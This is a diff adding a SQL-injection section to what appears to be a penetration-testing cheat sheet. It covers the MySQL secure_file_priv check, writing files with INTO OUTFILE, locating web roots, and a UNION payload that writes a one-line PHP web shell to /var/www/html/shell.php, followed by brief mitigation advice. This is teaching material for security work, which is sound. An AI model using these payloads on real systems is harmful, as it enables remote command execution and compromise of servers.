@@ -915,6 +915,65 @@ Requirements:
   2. MySQL global `secure_file_priv` variable not enabled
   3. Write access to the location we want to write to on the back-end server
 
+##### secure_file_priv
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+```sql
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+```
+
+```sql
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
+```
+
+##### SELECT INTO OUTFILE
+
+Write output from a `SELECT` query into a file.
+
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+Write any string into a file.
+
+```sql
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+
+##### Writing Files through SQL Injection
+
+If we want to write a web shell we need to know the base web directory. One way to find it out is the `load_file` function which shows us Apache's configuration, this can be found at `/etc/apache2/apache2.conf`, Nginx's at `/etc/nginx/nginx.conf` and IIS at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`. Alternatively, a fuzzing scan would still be possible with [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) and [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).
+
+A `UNION` injection for poof can look like this:
+
+```sql
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 
+```
+
+##### Writing a Web Shell (PHP)
+
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+If we use the `PHP` code from above and inject it to the server, we should have the ability to run commands. When we got to the `/shell.php` file we should be able to pass commands to the `0` parameter with `?0=id` with the URL.
+
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
+```
+
+#### Mitigating SQL Injection
+
+If possible restrict valid characters, give the database user the least required permissions, use a `WAF` and parameterized queries.
+
+##### PHP
+
+Use the [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)or the [pg_escape_string()](https://www.php.net/manual/en/function.pg-escape-string.php) function.
+
+
 ### MySQL
 
 To ensure that we are working with a `MySQL` Server we can use the following commands.
